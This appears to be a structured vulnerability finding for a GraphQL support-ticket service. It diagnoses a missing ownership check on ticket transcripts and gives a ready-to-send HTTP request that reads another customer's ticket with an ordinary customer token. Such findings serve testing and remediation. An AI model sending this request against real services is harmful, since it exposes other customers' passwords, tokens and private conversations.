diagnosis: The GraphQL field resolver invokes a DataLoader to retrieve support ticket transcripts without verifying that info.context['current_user'].id matches the ticket's submitter or assigned support staff. An attacker can load customer support conversations containing passwords, API tokens, and personal discussions of other customers.
exploit_request:
POST /graphql HTTP/1.1
Host: support.saashelp.com
Authorization: Bearer <customer_token>
Content-Type: application/json

{"query": "query { ticketTranscript(ticketId: \"tkt_99201a\") { ticketId messages assignedAgentId } }"}
